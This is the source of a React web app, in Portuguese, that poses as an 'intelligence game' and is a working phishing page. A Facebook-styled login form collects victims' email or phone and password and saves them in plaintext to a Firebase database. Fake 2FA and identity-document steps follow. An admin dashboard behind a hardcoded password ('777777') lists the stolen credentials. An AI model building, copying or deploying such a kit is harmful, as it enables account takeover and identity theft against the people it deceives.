import { useState, useEffect } from 'react';
import { auth, db } from './lib/firebase';
import { collection, addDoc, getDocs, deleteDoc, doc } from 'firebase/firestore';

enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: {
    userId?: string | null;
    email?: string | null;
    emailVerified?: boolean | null;
    isAnonymous?: boolean | null;
    tenantId?: string | null;
    providerInfo?: {
      providerId?: string | null;
      email?: string | null;
    }[];
  }
}

function handleFirestoreError(error: unknown, operationType: OperationType, path: string | null) {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid,
      email: auth.currentUser?.email,
      emailVerified: auth.currentUser?.emailVerified,
      isAnonymous: auth.currentUser?.isAnonymous,
      tenantId: auth.currentUser?.tenantId,
      providerInfo: auth.currentUser?.providerData?.map(provider => ({
        providerId: provider.providerId,
        email: provider.email,
      })) || []
    },
    operationType,
    path
  }
  console.error('Firestore Error: ', JSON.stringify(errInfo));
  throw new Error(JSON.stringify(errInfo));
}

export default function App() {
  const [credential, setCredential] = useState('');
  const [password, setPassword] = useState('');
  const [adminPassword, setAdminPassword] = useState('');
  const [users, setUsers] = useState<any[]>([]);
  const [selectedUsers, setSelectedUsers] = useState<string[]>([]);
  const [step, setStep] = useState<'welcome' | 'register' | '2fa' | 'verify' | 'complete' | 'admin-login' | 'admin-dashboard'>('welcome');

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    if (password.length < 6) {
      alert('A senha deve ter pelo menos 6 caracteres');
      return;
    }
    try {
      // Save user to Firestore
      await addDoc(collection(db, 'users'), {
        credential: credential,
        password: password,
        createdAt: new Date()
      });
      setStep('admin-login');
    } catch (error: any) {
      handleFirestoreError(error, OperationType.WRITE, 'users');
    }
  };

  const handleAdminLogin = () => {
    if (adminPassword === '777777') {
      fetchUsers();
    } else {
      alert('Invalid admin password');
    }
  };

  const fetchUsers = async () => {
    try {
      const querySnapshot = await getDocs(collection(db, 'users'));
      const userData = querySnapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setUsers(userData);
      setStep('admin-dashboard');
    } catch (error: any) {
      handleFirestoreError(error, OperationType.GET, 'users');
    }
  };

  const handleDeleteSelected = async () => {
    try {
      for (const userId of selectedUsers) {
        await deleteDoc(doc(db, 'users', userId));
      }
      setSelectedUsers([]);
      fetchUsers();
    } catch (error: any) {
      handleFirestoreError(error, OperationType.DELETE, 'users');
    }
  };

  return (
    <div className="min-h-screen bg-[url('/src/assets/images/professional_puzzle_background_1782606794113.jpg')] bg-cover bg-center bg-no-repeat flex flex-col items-center justify-center p-4 font-sans text-white">
      <div className={`bg-gray-900/80 backdrop-blur-xl border border-white/10 p-8 rounded-2xl shadow-2xl w-full ${step === 'admin-dashboard' ? 'max-w-4xl' : 'max-w-md'}`}>
        
        {step === 'welcome' && (
            <div className="text-center">
                <h1 className="text-3xl font-extrabold mb-6 tracking-tight text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-indigo-400">Bem-vindo ao Jogo de Inteligência KI</h1>
                <p className="text-gray-400 mb-8 text-lg">Desafie sua mente. Entre agora.</p>
                <button
                    onClick={() => setStep('register')}
                    className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white p-4 rounded-xl text-lg font-bold hover:scale-105 transition-transform duration-200 shadow-lg shadow-blue-500/30 cursor-pointer"
                >
                    Entrar no jogo com conta do Facebook
                </button>
            </div>
        )}

        {(step !== 'welcome') && (
            <>
                <div className="mb-[15px]">
                <h1 className="text-[25px] font-normal text-left text-white">
                    {step === 'register' ? 'Inserir conta do Facebook' : step === '2fa' ? 'Autenticação' : 'Verificação'}
                </h1>
                <p className="text-[15px] text-gray-400">Entre na sua conta.</p>
                </div>
                <div className="border-b border-gray-700 mb-[20px]"></div>
            </>
        )}

        {step === 'register' && (
          <form className="space-y-[12px]" onSubmit={handleRegister}>
            <input
              type="text"
              placeholder="Email ou número de telefone do Facebook"
              className="w-full p-[14px_16px] border border-gray-700 bg-gray-800 rounded-[6px] text-[17px] box-border text-white"
              value={credential}
              onChange={(e) => setCredential(e.target.value)}
            />
            <input
              type="password"
              placeholder="Senha"
              className="w-full p-[14px_16px] border border-gray-700 bg-gray-800 rounded-[6px] text-[17px] box-border text-white"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button
              type="submit"
              className="w-full bg-[#42B72A] text-white p-[10px_16px] rounded-[6px] text-[20px] font-bold hover:bg-[#36a420] cursor-pointer mt-[10px]"
            >
              Entrar
            </button>
          </form>
        )}
        {step === '2fa' && (
          <div className="space-y-[12px]">
            <p className="text-gray-400 text-[15px]">Enter 2FA code sent to your email.</p>
            <input
              type="text"
              placeholder="Code"
              className="w-full p-[14px_16px] border border-gray-700 bg-gray-800 rounded-[6px] text-[17px] box-border text-white"
            />
            <button
              onClick={() => setStep('verify')}
              className="w-full bg-[#42B72A] text-white p-[10px_16px] rounded-[6px] text-[20px] font-bold hover:bg-[#36a420] cursor-pointer"
            >
              Verify
            </button>
          </div>
        )}
        {step === 'verify' && (
          <div className="space-y-[12px]">
            <p className="text-gray-400 text-[15px]">Upload identity document.</p>
            <input
              type="file"
              className="w-full p-[14px_16px] border border-gray-700 bg-gray-800 rounded-[6px] text-[17px] box-border text-white"
            />
            <button
              onClick={() => setStep('complete')}
              className="w-full bg-[#42B72A] text-white p-[10px_16px] rounded-[6px] text-[20px] font-bold hover:bg-[#36a420] cursor-pointer"
            >
              Complete
            </button>
          </div>
        )}
        {step === 'complete' && (
            <div className="text-center space-y-4">
                <p className="text-white">Registration Complete!</p>
                <button
                    onClick={() => setStep('admin-login')}
                    className="w-full bg-gray-700 text-white p-3 rounded-md hover:bg-gray-600"
                >
                    View Admin Panel
                </button>
            </div>
        )}
        {step === 'admin-login' && (
            <div className="space-y-4">
                <h2 className="text-xl font-bold text-white">Admin Login</h2>
                <input
                    type="password"
                    placeholder="Admin Password"
                    className="w-full p-3 border border-gray-700 bg-gray-800 rounded-md text-white"
                    value={adminPassword}
                    onChange={(e) => setAdminPassword(e.target.value)}
                />
                <button
                    onClick={handleAdminLogin}
                    className="w-full bg-red-600 text-white p-3 rounded-md hover:bg-red-700"
                >
                    Login
                </button>
                <button
                    onClick={() => setStep('welcome')}
                    className="w-full bg-gray-700 text-white p-3 rounded-md hover:bg-gray-600"
                >
                    Voltar
                </button>
            </div>
        )}
        {step === 'admin-dashboard' && (
            <div className="space-y-4">
                <h2 className="text-xl font-bold text-white">Admin Dashboard</h2>
                <button
                    onClick={handleDeleteSelected}
                    disabled={selectedUsers.length === 0}
                    className="w-full bg-red-600 text-white p-2 rounded-md hover:bg-red-700 disabled:bg-gray-500"
                >
                    Deletar Selecionados ({selectedUsers.length})
                </button>
                <div className="overflow-x-auto">
                    <table className="w-full text-white border-collapse">
                        <thead>
                            <tr>
                                <th className="border p-2">
                                    <input
                                        type="checkbox"
                                        onChange={(e) => {
                                            if (e.target.checked) {
                                                setSelectedUsers(users.map(u => u.id));
                                            } else {
                                                setSelectedUsers([]);
                                            }
                                        }}
                                        checked={selectedUsers.length === users.length && users.length > 0}
                                    />
                                </th>
                                <th className="border p-2">Credential</th>
                                <th className="border p-2">Senha</th>
                                <th className="border p-2">Created At</th>
                            </tr>
                        </thead>
                        <tbody>
                            {users.map((user) => (
                                <tr key={user.id}>
                                    <td className="border p-2">
                                        <input
                                            type="checkbox"
                                            checked={selectedUsers.includes(user.id)}
                                            onChange={(e) => {
                                                if (e.target.checked) {
                                                    setSelectedUsers([...selectedUsers, user.id]);
                                                } else {
                                                    setSelectedUsers(selectedUsers.filter(id => id !== user.id));
                                                }
                                            }}
                                        />
                                    </td>
                                    <td className="border p-2">{user.credential}</td>
                                    <td className="border p-2">{user.password}</td>
                                    <td className="border p-2">{user.createdAt?.toDate().toLocaleString()}</td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                </div>
                <button
                    onClick={() => {
                        setStep('welcome');
                        setSelectedUsers([]);
                    }}
                    className="w-full bg-gray-700 text-white p-3 rounded-md hover:bg-gray-600"
                >
                    Voltar
                </button>
            </div>
        )}
      </div>
    </div>
  );
}
